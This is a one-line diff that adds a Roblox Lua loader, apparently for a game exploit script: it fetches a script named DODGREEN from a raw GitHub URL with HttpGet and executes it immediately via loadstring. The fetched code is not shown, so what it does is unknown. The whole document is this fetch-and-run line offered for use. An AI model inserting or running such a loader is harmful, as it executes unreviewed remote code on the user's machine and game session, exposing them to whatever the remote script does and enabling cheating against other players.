@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Robotnik-del/script-1/refs/heads/main/DODGREEN"))()
